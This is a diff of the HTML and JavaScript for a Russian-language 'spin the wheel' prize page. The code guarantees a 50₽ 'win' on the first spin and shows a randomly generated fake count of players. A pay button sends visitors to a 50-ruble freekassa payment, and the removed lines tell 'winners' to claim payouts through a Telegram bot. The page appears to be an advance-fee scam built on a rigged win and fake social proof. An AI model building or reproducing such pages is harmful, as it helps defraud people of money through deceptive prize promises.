@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -93,7 +92,6 @@
     const spinBtn = document.getElementById("spin");
     const payBtn = document.getElementById("payBtn");
     let hasSpun = false;
-    let lastCode = null;
 
     function generateCode(amount) {
       const timestamp = Date.now();
@@ -122,7 +120,6 @@
 
         if (win) {
           const code = generateCode(amount);
-          lastCode = code;
           result.innerHTML = `🎉 Поздравляем! Вы выиграли <b>${amount}₽</b><br><div class="code-block">${code}</div>`;
         } else {
           result.innerText = "😢 Увы, вы ничего не выиграли";
@@ -137,12 +134,7 @@
     spinBtn.onclick = spinWheel;
 
     payBtn.onclick = () => {
-      if (!lastCode) {
-        alert("Сначала крути колесо и получи код!");
-        return;
-      }
-      const url = `https://pay.freekassa.ru?m=F7202575639398546&oa=50&currency=RUB&us_code=${lastCode}`;
-      window.location.href = url;
+      window.location.href = "https://pay.freekassa.ru?m=F7202575639398546&oa=50&currency=RUB&us_site=vk-cash";
     };
 
     function updatePlayersCount() {
@@ -152,89 +144,6 @@
 
     setInterval(updatePlayersCount, 15000);
     updatePlayersCount();
-
-    if (window.location.search.includes("success=1")) {
-      result.innerHTML += "<br><b>✅ Оплата прошла! Теперь отправьте код и сумму в Telegram-бота для получения выплаты.</b>";
-    }
-  </script>
-</body>
-</html>
-
-  <div class="top-bar">
-    <p>📜 <a href="#">Правила участия</a> • <a href="#">FAQ</a> • <a href="#">Политика</a> • <a href="#">Поделиться</a></p>
-    <p>👑 Топ победители обновляются каждые 5 минут</p>
-    <p>🔁 Участников: <span id="playersCount"></span></p>
-  </div>
-
-  <script>
-    const wheel = document.getElementById("wheel");
-    const result = document.getElementById("result");
-    const spinBtn = document.getElementById("spin");
-    const payBtn = document.getElementById("payBtn");
-    let hasSpun = false;
-    let lastCode = "";
-
-    function generateCode(amount) {
-      const timestamp = Date.now();
-      const random = Math.random().toString(36).substring(2, 6).toUpperCase();
-      return `CODE-${amount}-${timestamp}-${random}`;
-    }
-
-    function spinWheel() {
-      let deg = Math.floor(3600 + Math.random() * 1000);
-      wheel.style.transform = `rotate(${deg}deg)`;
-
-      setTimeout(() => {
-        let win = false;
-        let amount = 0;
-
-        if (!hasSpun) {
-          win = true;
-          amount = 50;
-        } else {
-          const chance = Math.random();
-          if (chance < 0.25) {
-            win = true;
-            amount = [50, 100, 200, 300][Math.floor(Math.random() * 4)];
-          }
-        }
-
-        if (win) {
-          const code = generateCode(amount);
-          lastCode = code;
-          result.innerHTML = `🎉 Поздравляем! Вы выиграли <b>${amount}₽</b><br><div class="code-block">${code}</div>`;
-        } else {
-          result.innerText = "😢 Увы, вы ничего не выиграли";
-        }
-
-        hasSpun = true;
-        spinBtn.style.display = "none";
-        payBtn.style.display = "inline-block";
-      }, 4000);
-    }
-
-    spinBtn.onclick = spinWheel;
-
-    payBtn.onclick = () => {
-      if (!lastCode) {
-        alert("Сначала крути колесо!");
-        return;
-      }
-      const url = `https://pay.freekassa.ru?m=F7202575639398546&oa=50&currency=RUB&us_code=${lastCode}`;
-      window.open(url, "_blank");
-    };
-
-    function updatePlayersCount() {
-      const count = Math.floor(100 + Math.random() * 50);
-      document.getElementById("playersCount").innerText = count;
-    }
-
-    setInterval(updatePlayersCount, 15000);
-    updatePlayersCount();
-
-    if (window.location.search.includes("success=1")) {
-      result.innerHTML += "<br><b>✅ Оплата прошла! Теперь отправьте код и сумму в Telegram-бота.</b>";
-    }
   </script>
 </body>
 </html>
